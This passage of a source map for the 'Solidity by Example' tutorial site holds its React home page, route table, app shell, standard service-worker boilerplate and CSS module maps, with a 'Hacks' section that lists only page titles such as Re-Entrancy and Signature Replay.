},\n  {\n    path: \"uni-directional-payment-channel\",\n    title: \"Uni-directional Payment Channel\",\n  },\n  {\n    path: \"bi-directional-payment-channel\",\n    title: \"Bi-directional Payment Channel\",\n  },\n]\n\nconst HACK_ROUTES: Route[] = [\n  {\n    path: \"re-entrancy\",\n    title: \"Re-Entrancy\",\n  },\n  {\n    path: \"overflow\",\n    title: \"Arithmetic Overflow and Underflow\",\n  },\n  {\n    path: \"self-destruct\",\n    title: \"Self Destruct\",\n  },\n  {\n    path: \"accessing-private-data\",\n    title: \"Accessing Private Data\",\n  },\n  {\n    path: \"delegatecall\",\n    title: \"Delegatecall\",\n  },\n  {\n    path: \"randomness\",\n    title: \"Source of Randomness\",\n  },\n  {\n    path: \"denial-of-service\",\n    title: \"Denial of Service\",\n  },\n  {\n    path: \"phishing-with-tx-origin\",\n    title: \"Phishing with tx.origin\",\n  },\n  {\n    path: \"hiding-malicious-code-with-external-contract\",\n    title: \"Hiding Malicious Code with External Contract\",\n  },\n  {\n    path: \"honeypot\",\n    title: \"Honeypot\",\n  },\n  {\n    path: \"front-running\",\n    title: \"Front Running\",\n  },\n  {\n    path: \"block-timestamp-manipulation\",\n    title: \"Block Timestamp Manipulation\",\n  },\n  {\n    path: \"signature-replay\",\n    title: \"Signature Replay\",\n  },\n]\n\nexport const ROUTES_BY_CATEGORY = [\n  {\n    title: \"\",\n    routes: SOL_ROUTES,\n  },\n  {\n    title: \"Applications\",\n    routes: APP_ROUTES.map((route) => ({\n      ...route,\n      path: `/app/${route.path}`,\n    })),\n  },\n  {\n    title: \"Hacks\",\n    routes: HACK_ROUTES.map((route) => ({\n      ...route,\n      path: `/hacks/${route.path}`,\n    })),\n  },\n]\n\nconst UPDATES = [\n  \"2021/01/24 - Minimal Proxy Contract\",\n  \"2021/01/01 - Updated to 0.7.6\",\n]\n\nfunction HomePage() {\n  return (\n    <div className={styles.component}>\n      <SEO\n        title=\"Solidity by Example | 0.7.6\"\n        description=\"Learn smart contract programming using Solidity\"\n      />\n      <h1 className={styles.header}>\n        <a href=\"/\">Solidity by Example</a>\n      </h1>\n      <div className={styles.subHeader}>v 0.7.6</div>\n      <div className={styles.main}>\n        <p>\n          an introduction to{\" \"}\n          <a href=\"https://solidity.readthedocs.io\">Solidity</a> with simple\n          examples\n        </p>\n\n        <div className={styles.updates}>\n          {UPDATES.map((text, i) => (\n            <div key={i}>{text}</div>\n          ))}\n        </div>\n\n        {ROUTES_BY_CATEGORY.map(({ routes, title }, i) => (\n          <div key={i}>\n            {title && <h3>{title}</h3>}\n\n            <ul className={styles.list}>\n              {routes.map(({ path, title, breakingChanges, newFeature }) => (\n                <li className={styles.listItem} key={path}>\n                  <a href={path}>{title}</a>\n                  {(breakingChanges || newFeature) && (\n                    <div className={styles.label}>\n                      <Label\n                        type={\n                          breakingChanges ? \"breakingChanges\" : \"newFeature\"\n                        }\n                      />\n                    </div>\n                  )}\n                </li>\n              ))}\n            </ul>\n          </div>\n        ))}\n      </div>\n    </div>\n  )\n}\n\nexport default HomePage\n","import component_app_bi_directional_payment_channel from \"./pages/app/bi-directional-payment-channel\"\nimport component_app_create2 from \"./pages/app/create2\"\nimport component_app_erc20 from \"./pages/app/erc20\"\nimport component_app_iterable_mapping from \"./pages/app/iterable-mapping\"\nimport component_app_merkle_tree from \"./pages/app/merkle-tree\"\nimport component_app_minimal_proxy from \"./pages/app/minimal-proxy\"\nimport component_app_multi_sig_wallet from \"./pages/app/multi-sig-wallet\"\nimport component_app_uni_directional_payment_channel from \"./pages/app/uni-directional-payment-channel\"\nimport component_array from \"./pages/array\"\nimport component_call from \"./pages/call\"\nimport component_calling_contract from \"./pages/calling-contract\"\nimport component_constructor from \"./pages/constructor\"\nimport component_data_locations from \"./pages/data-locations\"\nimport component_delegatecall from \"./pages/delegatecall\"\nimport component_enum from \"./pages/enum\"\nimport component_error from \"./pages/error\"\nimport component_ether_units from \"./pages/ether-units\"\nimport component_events from \"./pages/events\"\nimport component_fallback from \"./pages/fallback\"\nimport component_first_app from \"./pages/first-app\"\nimport component_function from \"./pages/function\"\nimport component_function_modifier from \"./pages/function-modifier\"\nimport component_gas from \"./pages/gas\"\nimport component_hacks_accessing_private_data from \"./pages/hacks/accessing-private-data\"\nimport component_hacks_block_timestamp_manipulation from \"./pages/hacks/block-timestamp-manipulation\"\nimport component_hacks_delegatecall from \"./pages/hacks/delegatecall\"\nimport component_hacks_denial_of_service from \"./pages/hacks/denial-of-service\"\nimport component_hacks_front_running from \"./pages/hacks/front-running\"\nimport component_hacks_hiding_malicious_code_with_external_contract from \"./pages/hacks/hiding-malicious-code-with-external-contract\"\nimport component_hacks_honeypot from \"./pages/hacks/honeypot\"\nimport component_hacks_overflow from \"./pages/hacks/overflow\"\nimport component_hacks_phishing_with_tx_origin from \"./pages/hacks/phishing-with-tx-origin\"\nimport component_hacks_randomness from \"./pages/hacks/randomness\"\nimport component_hacks_re_entrancy from \"./pages/hacks/re-entrancy\"\nimport component_hacks_self_destruct from \"./pages/hacks/self-destruct\"\nimport component_hacks_signature_replay from \"./pages/hacks/signature-replay\"\nimport component_hashing from \"./pages/hashing\"\nimport component_hello_world from \"./pages/hello-world\"\nimport component_if_else from \"./pages/if-else\"\nimport component_import from \"./pages/import\"\nimport component_inheritance from \"./pages/inheritance\"\nimport component_interface from \"./pages/interface\"\nimport component_library from \"./pages/library\"\nimport component_loop from \"./pages/loop\"\nimport component_mapping from \"./pages/mapping\"\nimport component_new_contract from \"./pages/new-contract\"\nimport component_payable from \"./pages/payable\"\nimport component_primitives from \"./pages/primitives\"\nimport component_sending_ether from \"./pages/sending-ether\"\nimport component_shadowing_inherited_state_variables from \"./pages/shadowing-inherited-state-variables\"\nimport component_signature from \"./pages/signature\"\nimport component_state_variables from \"./pages/state-variables\"\nimport component_structs from \"./pages/structs\"\nimport component_super from \"./pages/super\"\nimport component_try_catch from \"./pages/try-catch\"\nimport component_variables from \"./pages/variables\"\nimport component_view_and_pure_functions from \"./pages/view-and-pure-functions\"\nimport component_visibility from \"./pages/visibility\"\nimport component_ from \"./pages\"\n\ninterface Route {\n  path: string\n  component: () => JSX.Element\n  breakingChanges?: boolean\n}\n\nconst routes: Route[] = [\n    {\n        path: \"/app/bi-directional-payment-channel\",\n        component: component_app_bi_directional_payment_channel\n    },\n    {\n        path: \"/app/create2\",\n        component: component_app_create2\n    },\n    {\n        path: \"/app/erc20\",\n        component: component_app_erc20\n    },\n    {\n        path: \"/app/iterable-mapping\",\n        component: component_app_iterable_mapping\n    },\n    {\n        path: \"/app/merkle-tree\",\n        component: component_app_merkle_tree\n    },\n    {\n        path: \"/app/minimal-proxy\",\n        component: component_app_minimal_proxy\n    },\n    {\n        path: \"/app/multi-sig-wallet\",\n        component: component_app_multi_sig_wallet\n    },\n    {\n        path: \"/app/uni-directional-payment-channel\",\n        component: component_app_uni_directional_payment_channel\n    },\n    {\n        path: \"/array\",\n        component: component_array\n    },\n    {\n        path: \"/call\",\n        component: component_call\n    },\n    {\n        path: \"/calling-contract\",\n        component: component_calling_contract\n    },\n    {\n        path: \"/constructor\",\n        component: component_constructor\n    },\n    {\n        path: \"/data-locations\",\n        component: component_data_locations\n    },\n    {\n        path: \"/delegatecall\",\n        component: component_delegatecall\n    },\n    {\n        path: \"/enum\",\n        component: component_enum\n    },\n    {\n        path: \"/error\",\n        component: component_error\n    },\n    {\n        path: \"/ether-units\",\n        component: component_ether_units\n    },\n    {\n        path: \"/events\",\n        component: component_events\n    },\n    {\n        path: \"/fallback\",\n        component: component_fallback\n    },\n    {\n        path: \"/first-app\",\n        component: component_first_app\n    },\n    {\n        path: \"/function\",\n        component: component_function\n    },\n    {\n        path: \"/function-modifier\",\n        component: component_function_modifier\n    },\n    {\n        path: \"/gas\",\n        component: component_gas\n    },\n    {\n        path: \"/hacks/accessing-private-data\",\n        component: component_hacks_accessing_private_data\n    },\n    {\n        path: \"/hacks/block-timestamp-manipulation\",\n        component: component_hacks_block_timestamp_manipulation\n    },\n    {\n        path: \"/hacks/delegatecall\",\n        component: component_hacks_delegatecall\n    },\n    {\n        path: \"/hacks/denial-of-service\",\n        component: component_hacks_denial_of_service\n    },\n    {\n        path: \"/hacks/front-running\",\n        component: component_hacks_front_running\n    },\n    {\n        path: \"/hacks/hiding-malicious-code-with-external-contract\",\n        component: component_hacks_hiding_malicious_code_with_external_contract\n    },\n    {\n        path: \"/hacks/honeypot\",\n        component: component_hacks_honeypot\n    },\n    {\n        path: \"/hacks/overflow\",\n        component: component_hacks_overflow\n    },\n    {\n        path: \"/hacks/phishing-with-tx-origin\",\n        component: component_hacks_phishing_with_tx_origin\n    },\n    {\n        path: \"/hacks/randomness\",\n        component: component_hacks_randomness\n    },\n    {\n        path: \"/hacks/re-entrancy\",\n        component: component_hacks_re_entrancy\n    },\n    {\n        path: \"/hacks/self-destruct\",\n        component: component_hacks_self_destruct\n    },\n    {\n        path: \"/hacks/signature-replay\",\n        component: component_hacks_signature_replay\n    },\n    {\n        path: \"/hashing\",\n        component: component_hashing\n    },\n    {\n        path: \"/hello-world\",\n        component: component_hello_world\n    },\n    {\n        path: \"/if-else\",\n        component: component_if_else\n    },\n    {\n        path: \"/import\",\n        component: component_import\n    },\n    {\n        path: \"/inheritance\",\n        component: component_inheritance\n    },\n    {\n        path: \"/interface\",\n        component: component_interface\n    },\n    {\n        path: \"/library\",\n        component: component_library\n    },\n    {\n        path: \"/loop\",\n        component: component_loop\n    },\n    {\n        path: \"/mapping\",\n        component: component_mapping\n    },\n    {\n        path: \"/new-contract\",\n        component: component_new_contract\n    },\n    {\n        path: \"/payable\",\n        component: component_payable\n    },\n    {\n        path: \"/primitives\",\n        component: component_primitives\n    },\n    {\n        path: \"/sending-ether\",\n        component: component_sending_ether\n    },\n    {\n        path: \"/shadowing-inherited-state-variables\",\n        component: component_shadowing_inherited_state_variables\n    },\n    {\n        path: \"/signature\",\n        component: component_signature\n    },\n    {\n        path: \"/state-variables\",\n        component: component_state_variables\n    },\n    {\n        path: \"/structs\",\n        component: component_structs\n    },\n    {\n        path: \"/super\",\n        component: component_super\n    },\n    {\n        path: \"/try-catch\",\n        component: component_try_catch\n    },\n    {\n        path: \"/variables\",\n        component: component_variables\n    },\n    {\n        path: \"/view-and-pure-functions\",\n        component: component_view_and_pure_functions\n    },\n    {\n        path: \"/visibility\",\n        component: component_visibility\n    },\n    {\n        path: \"\",\n        component: component_\n    },\n]\n\nexport default routes","import React from \"react\"\nimport { BrowserRouter as Router, Switch, Route } from \"react-router-dom\"\nimport styles from \"./App.module.css\"\nimport Header from \"./components/Header\"\nimport Footer from \"./components/Footer\"\nimport routes from \"./routes\"\n\nfunction App() {\n  return (\n    <Router basename={process.env.PUBLIC_URL}>\n      <div className={styles.component}>\n        <Header />\n        <div className={styles.main}>\n          <Switch>\n            {routes.map((route) => (\n              <Route\n                key={route.path}\n                path={route.path}\n                exact\n                component={route.component}\n              />\n            ))}\n          </Switch>\n        </div>\n        <div className={styles.footer}>\n          <Footer />\n        </div>\n      </div>\n    </Router>\n  )\n}\n\nexport default App\n","// This optional code is used to register a service worker.\n// register() is not called by default.\n\n// This lets the app load faster on subsequent visits in production, and gives\n// it offline capabilities. However, it also means that developers (and users)\n// will only see deployed updates on subsequent visits to a page, after all the\n// existing tabs open on the page have been closed, since previously cached\n// resources are updated in the background.\n\n// To learn more about the benefits of this model and instructions on how to\n// opt-in, read https://bit.ly/CRA-PWA\n\nconst isLocalhost = Boolean(\n  window.location.hostname === 'localhost' ||\n    // [::1] is the IPv6 localhost address.\n    window.location.hostname === '[::1]' ||\n    // 127.0.0.0/8 are considered localhost for IPv4.\n    window.location.hostname.match(\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\n    )\n);\n\ntype Config = {\n  onSuccess?: (registration: ServiceWorkerRegistration) => void;\n  onUpdate?: (registration: ServiceWorkerRegistration) => void;\n};\n\nexport function register(config?: Config) {\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\n    // The URL constructor is available in all browsers that support SW.\n    const publicUrl = new URL(\n      process.env.PUBLIC_URL,\n      window.location.href\n    );\n    if (publicUrl.origin !== window.location.origin) {\n      // Our service worker won't work if PUBLIC_URL is on a different origin\n      // from what our page is served on. This might happen if a CDN is used to\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\n      return;\n    }\n\n    window.addEventListener('load', () => {\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\n\n      if (isLocalhost) {\n        // This is running on localhost. Let's check if a service worker still exists or not.\n        checkValidServiceWorker(swUrl, config);\n\n        // Add some additional logging to localhost, pointing developers to the\n        // service worker/PWA documentation.\n        navigator.serviceWorker.ready.then(() => {\n          console.log(\n            'This web app is being served cache-first by a service ' +\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\n          );\n        });\n      } else {\n        // Is not localhost. Just register service worker\n        registerValidSW(swUrl, config);\n      }\n    });\n  }\n}\n\nfunction registerValidSW(swUrl: string, config?: Config) {\n  navigator.serviceWorker\n    .register(swUrl)\n    .then(registration => {\n      registration.onupdatefound = () => {\n        const installingWorker = registration.installing;\n        if (installingWorker == null) {\n          return;\n        }\n        installingWorker.onstatechange = () => {\n          if (installingWorker.state === 'installed') {\n            if (navigator.serviceWorker.controller) {\n              // At this point, the updated precached content has been fetched,\n              // but the previous service worker will still serve the older\n              // content until all client tabs are closed.\n              console.log(\n                'New content is available and will be used when all ' +\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\n              );\n\n              // Execute callback\n              if (config && config.onUpdate) {\n                config.onUpdate(registration);\n              }\n            } else {\n              // At this point, everything has been precached.\n              // It's the perfect time to display a\n              // \"Content is cached for offline use.\" message.\n              console.log('Content is cached for offline use.');\n\n              // Execute callback\n              if (config && config.onSuccess) {\n                config.onSuccess(registration);\n              }\n            }\n          }\n        };\n      };\n    })\n    .catch(error => {\n      console.error('Error during service worker registration:', error);\n    });\n}\n\nfunction checkValidServiceWorker(swUrl: string, config?: Config) {\n  // Check if the service worker can be found. If it can't reload the page.\n  fetch(swUrl, {\n    headers: { 'Service-Worker': 'script' }\n  })\n    .then(response => {\n      // Ensure service worker exists, and that we really are getting a JS file.\n      const contentType = response.headers.get('content-type');\n      if (\n        response.status === 404 ||\n        (contentType != null && contentType.indexOf('javascript') === -1)\n      ) {\n        // No service worker found. Probably a different app. Reload the page.\n        navigator.serviceWorker.ready.then(registration => {\n          registration.unregister().then(() => {\n            window.location.reload();\n          });\n        });\n      } else {\n        // Service worker found. Proceed as normal.\n        registerValidSW(swUrl, config);\n      }\n    })\n    .catch(() => {\n      console.log(\n        'No internet connection found. App is running in offline mode.'\n      );\n    });\n}\n\nexport function unregister() {\n  if ('serviceWorker' in navigator) {\n    navigator.serviceWorker.ready\n      .then(registration => {\n        registration.unregister();\n      })\n      .catch(error => {\n        console.error(error.message);\n      });\n  }\n}\n","import React from \"react\"\nimport { hydrate, render } from \"react-dom\"\nimport \"./index.css\"\nimport App from \"./App\"\nimport * as serviceWorker from \"./serviceWorker\"\n\nconst rootElement = document.getElementById(\"root\")\n// @ts-ignore\nif (rootElement.hasChildNodes()) {\n  hydrate(<App />, rootElement)\n} else {\n  render(<App />, rootElement)\n}\n\n// If you want your app to work offline and load faster, you can change\n// unregister() to register() below. Note this comes with some pitfalls.\n// Learn more about service workers: http://bit.ly/CRA-PWA\nserviceWorker.unregister()\n","// extracted by mini-css-extract-plugin\nmodule.exports = {\"component\":\"Footer_component__2wm-B\",\"row\":\"Footer_row__3cluQ\",\"bar\":\"Footer_bar__93usQ\",\"khan\":\"Footer_khan__3lTcL\"};","// extracted by mini-css-extract-plugin\nmodule.exports = {\"component\":\"pages_component__1bqIE\",\"updates\":\"pages_updates__3xY-4\",\"listItem\":\"pages_listItem__1RzOh\",\"label\":\"pages_label__i9P1V\",\"header\":\"pages_header__o5uPl\"};"],"sourceRoot":""}